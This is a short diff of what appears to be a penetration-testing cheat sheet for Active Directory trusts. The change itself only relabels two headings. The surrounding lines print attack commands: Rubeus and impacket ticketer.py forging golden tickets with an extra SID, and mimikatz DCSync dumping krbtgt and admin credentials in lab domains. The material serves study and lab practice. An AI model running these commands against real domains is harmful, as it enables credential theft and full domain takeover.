@@ -1536,7 +1536,7 @@ C:\> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:<domain> 
 $ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain <domain> -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 <username>
 ```
 
-- Child -> Parent Trusts (Mimikatz)
+- Child -> Parent Trusts (Windows - Mimikatz)
 
 ```
 mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
@@ -1552,7 +1552,7 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
 
-- Child -> Parent Trusts (Rubeus)
+- Child -> Parent Trusts (Windows - Rubeus)
 
 ```
 mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
